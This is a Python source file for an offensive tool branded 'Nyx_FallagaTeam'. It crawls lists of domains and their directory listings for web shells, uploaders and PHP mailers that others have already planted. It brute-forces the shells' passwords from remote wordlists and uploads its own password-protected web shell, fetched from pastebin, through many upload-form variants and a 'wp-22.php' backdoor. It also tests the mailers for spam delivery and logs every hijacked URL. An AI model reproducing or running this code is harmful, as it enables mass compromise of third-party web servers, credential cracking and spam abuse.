import requests  
from re import findall as reg
from functools import partial
import os , sys , time , random 
from concurrent.futures import ThreadPoolExecutor
try:
    from modules import logos
except:
    import logos

fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
fb = '\033[94m'
flc = '\033[96m'
bd = '\u001b[1m'
res = '\u001b[0m'

requests.packages.urllib3.disable_warnings()

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

headers2 = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

checked = []

types = [
    {'type':'mailer','keyword':{'Leaf PHPMailer</title'}},
    {'type':'mailer','keyword':{'Subject','HTML','type="submit"','plain','textarea'}},
    {'type':'config','keyword':{'Linux','enctype="multipart/form-data" name="uploader"','_upl','Bypass','403'}},
    {'type':'config','keyword':{'Windows','enctype="multipart/form-data" name="uploader"','_upl','Bypass','403'}},
    {'type':'shell','keyword':{'Owner/Group','.php'}},
    {'type':'shell','keyword':{'Linux','.php','FilesMan'}},
    {'type':'shell','keyword':{'Windows','.php','FilesMan'}},
    {'type':'shell','keyword':{'Linux','.php','NYXCHECKPERMS'}},
    {'type':'shell','keyword':{'Windows','.php','NYXCHECKPERMS'}},
    {'type':'shell','keyword':{'Linux','0755','method="post" enctype="multipart/form-data"'}},
    {'type':'shell','keyword':{'Windows','0755','method="post" enctype="multipart/form-data"'}},
    {'type':'shell','keyword':{'File Upload','NYXCHECKPERMS','.php'}},
    {'type':'shell','keyword':{'public_html','0755','Sh3LL'}},
    {'type':'shell','keyword':{'Shell','UnknownSec','.php','NYXCHECKPERMS'}},
    {'type':'shell','keyword':{'.php','NYXCHECKPERMS','method="post" enctype="multipart/form-data"'}},
    {'type':'shell','keyword':{'.php','NYXCHECKPERMS','Path','type="file" name="file"'}},
    {'type':'shell','keyword':{'.php','Current Path','type="file"','public_html','enctype="multipart/form-data"'}},
    {'type':'shell','keyword':{'.php','0755','root:root','Rename','Delete'}},
    {'type':'password','keyword':{'type="password" name="peswed"','method="post"'}},
    {'type':'password','keyword':{"type='password' name='pass'","type='submit' value='>>'"}},
    {'type':'password','keyword':{'type=password name=pass',"type=submit name='watching'"}},
    {'type':'password','keyword':{"name='postpass' type='password'","type='submit'","method='post'"}},
    {'type':'uploader','keyword':{'Vuln!! patch it Now!','"multipart/form-data" name="uploader"'}},
    {'type':'uploader','keyword':{'enctype="multipart/form-data" name="uploader"','name="_upl" type="submit"'}},
    {'type':'uploader','keyword':{'enctype="multipart/form-data"','name="filename"','#p@@#'}},
    {'type':'uploader','keyword':{'enctype="multipart/form-data"','<input type="file"','type="submit"'}},
    {'type':'uploader','keyword':{"method='POST' enctype='multipart/form-data'","type='file'","name='file'","type='submit'"}},
    {'type':'uploader','keyword':{'Chitoge kirisaki <3',"type='submit' name='upload' value='upload'","type='file' name='idx_file'","method='post' enctype='multipart/form-data'"}}
    ]

def clrscr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    return

def print_slow(x):
    for line in x.split("\n"):
        print(line)
        time.sleep(0.12)

def FilesNyx():
    global permissions ,shellsnames , passwords , indexofpaths , up
    try:
        url ='https://raw.githubusercontent.com/firasZX232/Linux-permissions/main/permissions.txt'
        req = requests.get(url).text
        permissions = reg('(.*?)\n',req)
        permissions = [*set(permissions)]

        url = 'https://raw.githubusercontent.com/NyxFallagaTn/Nyx_FallagaTn/main/shell_name.txt'
        req = requests.get(url).text
        shellsnames = reg('(.*?)\n',req)
        shellsnames = [*set(shellsnames)]

        url = 'https://raw.githubusercontent.com/NyxFallagaTn/Nyx_FallagaTn/main/indexofpaths.txt'
        req = requests.get(url).text
        indexofpaths = reg('(.*?)\n',req)
        indexofpaths = [*set(indexofpaths)]

        url = 'https://raw.githubusercontent.com/NyxFallagaTn/Nyx_FallagaTn/main/shell_passwords.txt'
        req = requests.get(url).text
        passwords = reg('(.*?)\n',req)
        passwords = [*set(passwords)]
        
        up = requests.get('https://pastebin.com/raw/sb3g33Na').text
        up = bytes(up, 'utf-8')
    except:
        print('{}[-] Un-able to load Files{}'.format(fr,fw))
        exit()

def get_upload():
    global up2
    up2 = requests.get('https://pastebin.com/raw/sb3g33Na').text

get_upload()
FilesNyx()

def checker_exist(url,filename):
    return check_dom_in_list(url,filename) and check_if_exist(filename,url)

def Extract_Path_URL(url):
    path = str(url).replace('https://','http://').replace(URLdomain(DomainExtractFromLink(url)),'')
    return path

def DomainExtractFromLink(url):
    if 'http://' in str(url) or 'https://' in str(url):
        dom = str(url).replace('http://','').replace('https://','').split('/')[0]
    else:
        dom = str(url).split('/')[0]
    return dom

def check_dom_in_list(url,filename):
    cc = 0
    open(filename,'a')
    url = DomainExtractFromLink(str(url))
    check = list(x.strip() for x in open(filename,'r',errors='ignore').readlines())
    for i in check:
        if str(url) in str(i):
            cc += 1
    if cc == 0:
        return True
    else:
        return False

def check_if_exist(filename,shell):
    open(filename,'a')
    check = list(x.strip() for x in open(filename,'r',errors='ignore').readlines())
    if str(shell) not in check:
        return True
    else:
        return False

def URLdomain(url):
    if 'http://' not in str(url) and 'https://' not in str(url):
        url = 'http://' + url
    else:
        url = str(url).replace('https://','http://').replace('www.','')
    if url[-1] =='/':url = url[:-1]
    return url

def CPE(source):
    found_perm = 0
    permcount = 0
    while True:
        if permcount == int(len(permissions)):break
        if str(permissions[int(permcount)]) in str(source):
            found_perm +=1
            break
        permcount +=1
    if found_perm !=0:
        return True
    else:
        return False

def checkallkeywords(source,keywords):
    keywords = list(x.strip() for x in keywords)
    count = 0
    FKW = 0
    while True:
        if count == int(len(keywords)):break
        if str(keywords[count]) == 'NYXCHECKPERMS':
            if CPE(source):
                FKW += 1
        if str(keywords[count]).lower() in str(source).lower():
            FKW += 1
        count += 1
    if FKW == int(len(keywords)):
        return True
    else:
        return False

def inboxgen():
    global urlcheckinbox, inbox , MAILSUB
    l = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    MAILSUB = ''
    for i in range(0, 10):
        MAILSUB += ''.join(random.choice(l))
    urlcheckinbox = 'https://tempmail.plus/en?{}@mailto.plus'.format(MAILSUB)
    inbox = urlcheckinbox.split('en?')[1]
    return MAILSUB

def checkinbox(xs):
    messages = []
    try:
        req = requests.get('https://tempmail.plus/api/mails?email={}%40mailto.plus&limit=100'.format(MAILSUB)).text
        mailids = reg('"mail_id":(.*?),',req)
        for i in mailids:
            req = requests.get('https://tempmail.plus/api/mails/{}?email={}%40mailto.plus'.format(i,MAILSUB)).content
            mailer = reg('Working Mailer : (.*?)","',str(req))[0]
            mailer = str(mailer).replace('\\n','').replace('\\','')
            messages.append(mailer)
        if str(xs) in messages:
            return True
        else:
            return False
    except:
        return False

def mailertester(url):
    inboxgen()
    sendtest = requests.get(url,headers=headers2,verify=False,timeout=10).text
    sendermail = reg('name="senderEmail" value="(.*?)">', sendtest)[0]
    if MAILSUB != '': 
        data = {
            'action': 'score',
            'senderEmail': f'{sendermail}',
            'senderName': '',
            'attachment[]': '(binary)',
            'replyTo': '',
            'subject': '',
            'messageLetter': 'Working Mailer : {}'.format(url),
            'emailList': '{}'.format(inbox),
            'messageType': '1',
            'charset': 'UTF-8',
            'encode': '8bit',
            'action': 'send'
            }
    else: 
        data = {
            'action': 'score',
            'senderEmail': f'{sendermail}',
            'senderName': '',
            'attachment[]': '(binary)',
            'replyTo': '',
            'subject': '',
            'messageLetter': 'Working Mailer : {}'.format(url),
            'emailList': '{}'.format(inbox),
            'messageType': '1',
            'charset': 'UTF-8',
            'encode': '8bit',
            'action': 'send'
            }
    try:
        reqsend = requests.post(url,headers=headers2,data=data,verify=False).text
        if '<span class="label label-success">Ok</span>' in str(reqsend):
            time.sleep(2)
            if checkinbox(url):
                print('{}[{}+{}] {} [{}MAILER{}] [{}WORKING{}|{}DELIVER{}]'.format(fw,fg,fw,url,fg,fw,fg,fw,fg,fw))
                open('mailer_D.txt','a',errors='ignore').write(url + '\n')
            else:
                print('{}[{}+{}] {} [{}MAILER{}] [{}WORKING{}|{}DELIVER{}]'.format(fw,fg,fw,url,fg,fw,fg,fw,fr,fw))
                open('mailer_W.txt','a',errors='ignore').write(url + '\n')
        else:
            print('{}[{}+{}] {} [{}MAILER{}] [{}WORKING{}|{}DELIVER{}]'.format(fw,fg,fw,url,fg,fw,fr,fw,fr,fw))
            open('mailer.txt','a',errors='ignore').write(url + '\n')
    except:
        pass

def grab_Files(url,source):
    if str(url) not in checked:
        path = Extract_Path_URL(url)
        files = reg('href="(.*?)"',source)
        files = [files for files in files if '/' not in str(files).replace(path,'') and '?C=N' not in str(files) and '?C=M' not in str(files) and '?C=S' not in str(files) and '?C=D' not in str(files) and '?ND' not in str(files) and '?MA' not in str(files) and '?SA' not in str(files) and '.php' in str(files).lower()]
        if int(len(files)) != 0:
            for i in files:
                i = str(i).split('/')[-1]
                exploit(url,i)
                checked.append(url)
    return

def indexofsearcher(url):
    global path
    try:
        req = requests.get(url, timeout=10).text
    except:
        req = ''
    if 'index of' not in str(req).lower():
        try:
            req = requests.get(url,headers=headers2, timeout=10).text
        except:pass
    if 'index of' in str(req).lower():
        req = str(req).split('<body>')[1]
        path = Extract_Path_URL(url)
        folders = [folder for folder in reg('href="(.*?)"',req) if '/' in str(folder).replace(path,'') and '.css' not in str(folder) and '.txt' not in str(folder) and '.pdf' not in str(folder) and '.xml' not in str(folder) and '.scss' not in str(folder)]
        for i in folders:
            check = reg('<a href="{}">(.*?)</a>'.format(i),req)
            if 'parent directory' in str(check).lower():
                folders.remove(i)
        folders = [folders.replace(path,'') for folders in folders]
        grab_Files(url,req)
        for i in folders:
            urlx = url + '/' +str(i)
            urlx = str(URLdomain(urlx)).replace('//','/').replace('http:/','http://')
            indexofsearcher(urlx)
    return

def link_no_file(shell):
    parts = shell.split('/')[:-1]
    link = ''
    for x in parts:
        if str(x) =='':
            link = link + str(x) + '//'
        else:
            link = link + str(x) + '/'
    link = link.replace('///','//')
    return link

def random_string():
    qsdnauhaon___________________________________skndbqscuyygazd = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    iqhdazhdazono__________azkdbazda_z___ = '456789'
    azuhqsdoaz = ''
    for i in range(0,int(random.choice(iqhdazhdazono__________azkdbazda_z___))):
        azuhqsdoaz += random.choice(qsdnauhaon___________________________________skndbqscuyygazd)
    return azuhqsdoaz

def autoupload(shell):
    if '?pass=nyxfallagatn' not in str(shell):
        session = requests.session()
        shellname = '{}.php'.format(random_string())
        upload1 = {'a': 'Filean','p1': 'uploadFile','ne': '','charset': 'UTF-8'}
        upload2 = {'a': 'BUbwxgj','p1': 'uploadFile','ne': '','charset': 'UTF-8'}
        upload3 = {'_upl': 'Upload'}
        upload4 = {'btn':''}
        upload5 = {'a': 'FilesMAn','p1': 'uploadFile','charset': 'Windows-1251'}
        upload_alfa = {'a': 'RmlsZXNNQW4=','alfa1': 'dXBsb2FkRmlsZQ==','charset': '','ajax': 'dHJ1ZQ=='}
        upload6 = {'p1': 'uploadFile'}
        upload7 = {'upload': 'upload'}
        upload8 = {'dirnya': '1','upwkwk': 'aplod','berkasnya': 'Upload','darilink': '','namalink': ''}
        file1 = {'f[]': (shellname,up)}
        file2 = {'file': (shellname,up)}
        file3 = {'filename': (shellname,up)}
        file4 = {'n[]': (shellname,up)}
        file5 = {'uploadfile[]': (shellname,up)}
        file6 = {'upl': (shellname,up)}
        file7 = {'f': (shellname,up)}
        file8 = {'zb': (shellname,up)}
        file9 = {'uploads': (shellname,up)}
        file10 = {'berkas': (shellname,up) }
        if '?pass' in str(shell):
            shell,pwd = str(shell).split('?pass=')
            try:
                session.post(shell,data={'pass':'{}'.format(pwd),'postpass':'{}'.format(pwd)}).text
            except:
                pass
        try:
            session.post(shell,files=file7,data=upload6,timeout=20).text
            url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
            check = session.get(url).text
            if 'Nyx_FallagaTeam' in str(check):
                return True,url
            else:
                session.post(shell,files=file1,data=upload2,timeout=20).text
                url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                check = session.get(url).text
                if 'Nyx_FallagaTeam' in str(check):
                    return True,url
                else:
                    session.post(shell,files=file2,timeout=20).text
                    url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                    check = session.get(url).text
                    if 'Nyx_FallagaTeam' in str(check):
                        return True,url
                    else:
                        session.post(shell,files=file3,timeout=20).text
                        url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                        check = session.get(url).text
                        if 'Nyx_FallagaTeam' in str(check):
                            return True,url
                        else:
                            session.post(shell,files=file2,data=upload3,timeout=20).text
                            url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                            check = session.get(url).text
                            if 'Nyx_FallagaTeam' in str(check):
                                return True,url
                            else:
                                session.post(shell,files=file4,timeout=20).text
                                url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                check = session.get(url).text
                                if 'Nyx_FallagaTeam' in str(check):
                                    return True,url
                                else:
                                    session.post(shell,files=file5,timeout=20).text
                                    url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                    check = session.get(url).text
                                    if 'Nyx_FallagaTeam' in str(check):
                                        return True,url
                                    else:
                                        session.post(shell,files=file1,data=upload_alfa,timeout=20).text
                                        url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                        check = session.get(url).text
                                        if 'Nyx_FallagaTeam' in str(check):
                                            return True,url
                                        else:
                                            session.post(shell,files=file6,data=upload4,timeout=20).text
                                            url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                            check = session.get(url).text
                                            if 'Nyx_FallagaTeam' in str(check):
                                                return True,url
                                            else:
                                                session.post(shell,files=file7,data=upload5,timeout=20).text
                                                url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                                check = session.get(url).text
                                                if 'Nyx_FallagaTeam' in str(check):
                                                    return True,url
                                                else:
                                                    session.post(shell,files=file1,data=upload1,timeout=20).text
                                                    url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                                    check = session.get(url).text
                                                    if 'Nyx_FallagaTeam' in str(check):
                                                        return True,url
                                                    else:
                                                        session.post(shell,files=file8,data=upload7,timeout=20).text
                                                        url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                                        check = session.get(url).text
                                                        if 'Nyx_FallagaTeam' in str(check):
                                                            return True,url
                                                        else:
                                                            session.post(shell,files=file9,timeout=20).text
                                                            url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                                            check = session.get(url).text
                                                            if 'Nyx_FallagaTeam' in str(check):
                                                                return True,url
                                                            else:
                                                                session.post(shell,files=file10,data=upload8,timeout=20).text
                                                                url = link_no_file(shell) + str(shellname) + '?pass=nyxfallagatn'
                                                                check = session.get(url).text
                                                                if 'Nyx_FallagaTeam' in str(check):
                                                                    return True,url
                                                                else:
                                                                    return False,shell
        except:
            return False,shell
    return False , shell

def password_cracker(url):
    count = 0
    success = 0
    req = requests.get(url).text
    while True:
        if count == int(len(passwords)):break
        pwd = passwords[count]
        try:
            ses = requests.Session()
            data ={'pass':'{}'.format(pwd),'postpass':'{}'.format(pwd)}
            ses.post(url,headers=headers2,data=data).text
            req = ses.get(url,headers=headers2).text
            req = str(req).lower()
            # print(req)
            if not(('method=post>password' in str(req) and "type='password' name='pass'" in str(req) and "type='submit' value='>>'" in str(req)) or ('method=post>password' in str(req) and 'type=password name=pass' in str(req) and "name='watching'" in str(req)) or ('method="post"' in str(req) and 'type="password" name="peswed"' in str(req)) or ("type='submit'" in str(req) and "name='postpass' type='password'" in str(req) and "method='post'" in str(req))):
                success +=1
                break
        except:pass
        count +=1
    if success !=0:
        urlx = '{}?pass={}'.format(url,pwd)
        if checker_exist(urlx,'password_cracked.txt'):
            print('{}[{}+{}] {} [{}PASSWORD : {}{}{}]'.format(fw,fg,fw,url,fg,fr,str(pwd),fw))
            tt = autoupload(urlx)
            if tt[0] == True:
                print('{}[{}+{}] {} [UPLOAD : {}SUCCESS{}]'.format(fw,fg,fw,URLdomain(DomainExtractFromLink(urlx)),fg,fw))
                open('Uploaded.txt','a',errors='ignore').write(tt[1]+'\n')
            else:
                open('password_cracked.txt','a',errors='ignore').write(urlx + '\n')
        else:
            print('{}[{}-{}] {} [{}ALREADY EXIST{}]'.format(fw,fr,fw,URLdomain(DomainExtractFromLink(urlx)),fr,fw))
    else:
        if checker_exist(url,'password.txt'):
            print('{}[{}-{}] {} [{}PASSWORD{}]'.format(fw,fr,fw,url,fr,fw))
            open('password.txt','a',errors='ignore').write(url + '\n')
        else:
            print('{}[{}-{}] {} [{}ALREADY EXIST{}]'.format(fw,fr,fw,URLdomain(DomainExtractFromLink(url)),fr,fw))

def Nyx_seeker(url):
    global checked , CHECK
    CHECK = 0
    cc = 0
    url = URLdomain(url)
    for i in indexofpaths:
        urlx = url + '/' +str(i)
        urlx = str(urlx).replace('//','/').replace('http:/','http://')
        try:
            req = requests.get(urlx, timeout=10).text
            if 'index of' in str(req).lower():
                if CHECK != 1 :
                    title = reg('<title>(.*?)</title>',req)[0]
                    title = str(title).lower().replace(' ','')
                    CHECK +=1
                else:
                    cctt = reg('<title>(.*?)</title>',req)[0]
                    cctt = str(cctt).lower().replace(' ','')
                    if str(cctt) == str(title):
                        cc +=1
                print('{}[{}+{}] {} [{}PATH {}{}] [{}SUCCESS{}]'.format(fw,fg,fw,DomainExtractFromLink(url),fr,indexofpaths.index(str(i)),fw,fg,fw))
                indexofsearcher(urlx)
            else:
                print('{}[{}-{}] {} [{}PATH {}{}] [{}FAIL{}]'.format(fw,fr,fw,DomainExtractFromLink(url),fr,indexofpaths.index(str(i)),fw,fr,fw))
        except:
            try:
                urlx = str(urlx).replace('http://','https://')
                req = requests.get(urlx, timeout=10).text
                if 'index of' in str(req).lower():
                    if CHECK != 1 :
                        title = reg('<title>(.*?)</title>',req)[0]
                        title = str(title).lower().replace(' ','')
                        CHECK +=1
                    else:
                        cctt = reg('<title>(.*?)</title>',req)[0]
                        cctt = str(cctt).lower().replace(' ','')
                        if str(cctt) == str(title):
                            cc +=1
                    print('{}[{}+{}] {} [{}PATH {}{}] [{}SUCCESS{}]'.format(fw,fg,fw,DomainExtractFromLink(url),fr,indexofpaths.index(str(i)),fw,fg,fw))
                    indexofsearcher(urlx)
                else:
                    print('{}[{}-{}] {} [{}PATH {}{}] [{}FAIL{}]'.format(fw,fr,fw,DomainExtractFromLink(url),fr,indexofpaths.index(str(i)),fw,fr,fw))
            except:
                print('{}[{}-{}] {} [{}PATH {}{}] [{}FAIL{}]'.format(fw,fr,fw,DomainExtractFromLink(url),fr,indexofpaths.index(str(i)),fw,fr,fw))
                pass
    try:
        with ThreadPoolExecutor(100) as executor:
            executor.map(partial(exploit,url),shellsnames)
    except:
        pass

def exploit_wp22(domain):
    shellname = 'nyx.php'
    try:
        if 'http' not in str(domain):
            domain = 'http://' + str(domain)
        url = '{}/wp-22.php?sfilename={}&sfilecontent={}&supfiles={}'.format(domain,shellname,up2,shellname)
        req = requests.get(url , headers , timeout=3).text
        if '{}success'.format(shellname) in str(req):
            req = requests.get('{}/nyx.php?pass=nyxfallagatn'.format(domain) , headers=headers , timeout=5).text
            if 'Nyx_FallagaTeam' in str(req):
                return True , req , '{}/{}?pass=nyxfallagatn'.format(domain,shellname)
            else:
                return False , ''
        else:
            return False , ''
    except:
        return False , ''

def exploit(urlxxx,path):
    urlxx = URLdomain(urlxxx)
    if str(path)[0] == '/' :
        urlx = urlxx + str(path)
    else:
        urlx = urlxx + '/' + str(path)
    urlx = str(urlx).replace('//','/').replace('http:/','http://').strip()
    count = 0
    found = 0
    try:
        req = requests.get(urlx, timeout=10).text
    except:
        try:
            req = requests.get(urlx, headers=headers2, verify=False, timeout=15).text
        except:
            req = requests.get(urlx, headers=headers2, verify=False, timeout=25).text
            pass
    if 'forbidden' in str(req).lower() or 'title>404' in str(req).lower() or 'title>not acceptable' in str(req).lower():
        try:
            req = requests.get(urlx, headers=headers2, timeout=15).text
        except:
            req = ''
    # print(req)
    if str(req) != '':
        while True:
            if count == int(len(types)):break
            type = types[count]
            if checkallkeywords(req,type['keyword']):
                if str(type['type']) == 'mailer':
                    mailertester(urlx)
                    found += 1
                elif str(type['type']) == 'password':
                    password_cracker(urlx)
                    found += 1
                else:
                    if checker_exist(urlx,'{}.txt'.format(str(type['type']))):
                        print('{}[{}+{}] {} [{}{}{}]'.format(fw,fg,fw,urlx,fg,str(type['type']).upper(),fw))
                        tt = autoupload(urlx)
                        if tt[0] == True:
                            print('{}[{}+{}] {} [UPLOAD : {}SUCCESS{}]'.format(fw,fg,fw,URLdomain(DomainExtractFromLink(urlx)),fg,fw))
                            open('Uploaded.txt','a',errors='ignore').write(tt[1]+'\n')
                        else:
                            open('{}.txt'.format(str(type['type'])),'a',errors='ignore').write(urlx + '\n')
                    else:
                        print('{}[{}-{}] {} [{}{}{}][{}ALREADY EXIST{}]'.format(fw,fr,fw,urlx,fg,str(type['type']).upper(),fw,fr,fw))
                    found += 1
                break
            count += 1
    req = exploit_wp22(urlxx)
    if req[0]:
        urlx = req[2]
    if str(req[1]) != '':
        while True:
            if count == int(len(types)):break
            type = types[count]
            if checkallkeywords(req[1],type['keyword']):
                if str(type['type']) == 'mailer':
                    mailertester(urlx)
                    found += 1
                elif str(type['type']) == 'password':
                    password_cracker(urlx)
                    found += 1
                else:
                    if checker_exist(urlx,'{}.txt'.format(str(type['type']))):
                        print('{}[{}+{}] {} [{}{}{}]'.format(fw,fg,fw,urlx,fg,str(type['type']).upper(),fw))
                        tt = autoupload(urlx)
                        if tt[0] == True:
                            print('{}[{}+{}] {} [UPLOAD : {}SUCCESS{}]'.format(fw,fg,fw,URLdomain(DomainExtractFromLink(urlx)),fg,fw))
                            open('Uploaded.txt','a',errors='ignore').write(tt[1]+'\n')
                        else:
                            open('{}.txt'.format(str(type['type'])),'a',errors='ignore').write(urlx + '\n')
                    else:
                        print('{}[{}-{}] {} [{}{}{}][{}ALREADY EXIST{}]'.format(fw,fr,fw,urlx,fg,str(type['type']).upper(),fw,fr,fw))
                    found += 1
                break
            count += 1
    if found == 0:
        open('Failed.txt','a',errors='ignore').write(urlx +'\n')
        print('{}[{}-{}] {} [{}FAIL{}]'.format(fw,fr,fw,urlx,fr,fw))
    return

def ex_check(url):
    url = URLdomain(url)
    exploit(URLdomain(DomainExtractFromLink(url)),Extract_Path_URL(url))

def ex_search(url):
    url = URLdomain(url)
    Nyx_seeker(url)

def ex_names(url):
    url = URLdomain(url)
    try:
        with ThreadPoolExecutor(100) as executor:
            executor.map(partial(exploit,url),shellsnames)
    except:
        pass

def SFcheck():
    try:
        lists = input('{}[{}#{}] Put Shells List : '.format(fw,fr,fw))
        readsplit = list(x.strip() for x in open(lists,'r',errors='ignore').readlines())
    except:
        if not os.path.isfile(lists):
            print("{}[-] ( {} ) is not found, please put it in the same folder.{}".format(fr,lists,fw))
        SFcheck()
    try:
        with ThreadPoolExecutor(100) as executor:
            executor.map(ex_check,readsplit)
    except:
        pass

def SFsearch():
    try:
        lists = input('{}[{}#{}] Put Domains List : '.format(fw,fr,fw))
        readsplit = list(x.strip() for x in open(lists,'r',errors='ignore').readlines())
    except:
        if not os.path.isfile(lists):
            print("{}[-] ( {} ) is not found, please put it in the same folder.{}".format(fr,lists,fw))
        SFsearch()
    try:
        with ThreadPoolExecutor(100) as executor:
            executor.map(ex_search,readsplit)
    except:
        pass

def SFsearch_names():
    global shellsnames
    try:
        shell_list = input('{}[{}#{}] Shell Names List : '.format(fw,fg,fw))
        shellsnames = list(x.strip() for x in open(shell_list,'r',errors='ignore').readlines())
        shellsnames = [*set(shellsnames)]
    except:
        print("{}[-] ( {} ) is not found, please put it in the same folder.{}".format(fr,shell_list,fw))
        SFsearch_names()
    try:
        lists = input('{}[{}#{}] Put Domains List : '.format(fw,fr,fw))
        readsplit = list(x.strip() for x in open(lists,'r',errors='ignore').readlines())
    except:
        if not os.path.isfile(lists):
            print("{}[-] ( {} ) is not found, please put it in the same folder.{}".format(fr,lists,fw))
            SFsearch_names()
    try:
        with ThreadPoolExecutor(100) as executor:
            executor.map(ex_names,readsplit)
    except Exception as e:
        print(e)
        pass